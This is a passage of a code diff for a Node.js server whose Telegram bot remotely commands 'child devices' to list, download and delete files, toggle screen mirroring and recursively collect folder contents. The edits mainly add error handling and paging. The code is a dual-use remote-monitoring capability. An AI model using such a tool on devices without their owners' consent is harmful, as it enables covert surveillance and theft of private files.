-              chatId, msgId: m.message_id,
-              type: 'list_dir', filterExt: 'all'
-            });
-            sendCommandToDevice(devId, { command: 'list_dir', path: folderPath });
-          });
+        setTimeout(async () => {
+          bot.sendMessage(chatId, `*${escapeMd(fileName)}* delete request pathano hoyeche.`, { parse_mode: 'Markdown' });
+          const m = await bot.sendMessage(chatId, 'Folder reload hocche…');
+          requestDeviceDir(chatId, m.message_id, devId, folderPath || STORAGE_ROOT, 'all', 0);
         }, 1500);
         return;
       }
@@ -1405,6 +1674,10 @@ Nischit delete korte chao?`,
     }
 
     bot.answerCallbackQuery(query.id);
+    } catch (err) {
+      console.error('[BOT] callback_query error:', err.message);
+      try { bot.answerCallbackQuery(query.id); } catch (_) {}
+    }
   });
 
   console.log("[BOT] All handlers registered (button-driven mode).");
@@ -1482,9 +1755,14 @@ function notifyCommandAck(deviceId, childName, command, success, message) {
 // ── Send command to child device ─────────────────────────────────────────
 function sendCommandToDevice(deviceId, cmdPayload) {
   const dev = childDevices.get(deviceId);
-  if (!dev) return false;
-  const payload = JSON.stringify({ type: "command", targetDeviceId: deviceId, ...cmdPayload });
-  dev.ws.send(payload);
+  if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) return false;
+  try {
+    const payload = JSON.stringify({ type: "command", targetDeviceId: deviceId, ...cmdPayload });
+    dev.ws.send(payload);
+  } catch (err) {
+    console.error('[WS] sendCommand failed:', err.message);
+    return false;
+  }
 
   if (cmdPayload.command === 'requested') dev.isMirroring = true;
   else if (cmdPayload.command === 'stopped') dev.isMirroring = false;
@@ -1700,13 +1978,26 @@ wss.on('connection', (ws, req) => {
           if (pending) {
             if (payload.action === 'list_dir_result' && pending.type === 'list_dir') {
               pendingBotFileRequests.delete(deviceId);
-              handleBotFileListing(pending.chatId, pending.msgId, deviceId, payload, pending.filterExt);
-            } else if (payload.action === 'download_file_result' && pending.type === 'download_file') {
+              if (payload.error) {
+                if (bot) bot.sendMessage(pending.chatId, `Error: ${escapeMd(payload.error)}`);
+              } else {
+                const listing = normalizeDirPayload(payload, pending.path);
+                handleBotFileListing(pending.chatId, pending.msgId, deviceId, listing, pending.filterExt, pending.page || 0);
+              }
+            } else if (payload.action === 'error' && pending.type === 'list_dir') {
               pendingBotFileRequests.delete(deviceId);
-              handleBotFileDownload(pending.chatId, deviceId, payload);
+              if (bot) bot.sendMessage(pending.chatId, `Error: ${escapeMd(payload.message || 'list failed')}`);
+            }
+          }
+
+          const pendingDl = pendingBotFileRequests.get(deviceId + '_dl');
+          if (pendingDl && pendingDl.type === 'download_file') {
+            if (payload.action === 'download_file_result') {
+              pendingBotFileRequests.delete(deviceId + '_dl');
+              handleBotFileDownload(pendingDl.chatId, deviceId, payload);
             } else if (payload.action === 'error') {
-              pendingBotFileRequests.delete(deviceId);
-              if (bot) bot.sendMessage(pending.chatId, `❌ Error: ${escapeMd(payload.message)}`);
+              pendingBotFileRequests.delete(deviceId + '_dl');
+              if (bot) bot.sendMessage(pendingDl.chatId, `Error: ${escapeMd(payload.message || 'download failed')}`);
             }
           }
 
@@ -1716,22 +2007,33 @@ wss.on('connection', (ws, req) => {
 
             // ── Phase 1: collecting folder contents recursively ──────────
             if (pendingAll.phase === 'scanning') {
-              const items      = payload.items || [];
-              const files      = items.filter(i => !i.isDirectory);
-              const subfolders = items.filter(i => i.isDirectory);
+              const listing    = normalizeDirPayload(payload, pendingAll.path);
+              const items      = listing.items;
+              const files      = items.filter(i => !isDirItem(i)).map(f => ({
+                ...f, path: itemFullPath(f, listing.currentPath)
+              }));
+              const subfolders = items.filter(isDirItem);
               const chatId2    = pendingAll.chatId;
+              pendingAll.path  = listing.currentPath;
 
-              // Add files found in this folder
               pendingAll.collectedFiles.push(...files);
 
-              // If subfolders exist, queue them for scanning
               if (subfolders.length > 0) {
-                pendingAll.scanQueue.push(...subfolders.map(f => f.path));
+                if (!pendingAll.visited) pendingAll.visited = new Set();
+                for (const f of subfolders) {
+                  const p = itemFullPath(f, listing.currentPath);
+                  if (!p || pendingAll.visited.has(p)) continue;
+                  pendingAll.visited.add(p);
+                  pendingAll.scanQueue.push(p);
+                }
+              }
+              if (pendingAll.visited && pendingAll.visited.size > 80) {
+                pendingAll.scanQueue.length = 0;
               }
 
-              // Process next folder in queue
               if (pendingAll.scanQueue.length > 0) {
                 const nextPath = pendingAll.scanQueue.shift();
+                pendingAll.path = nextPath;
                 pendingAll.scannedFolders = (pendingAll.scannedFolders || 0) + 1;
                 // Update scanning progress message
                 bot.editMessageText(
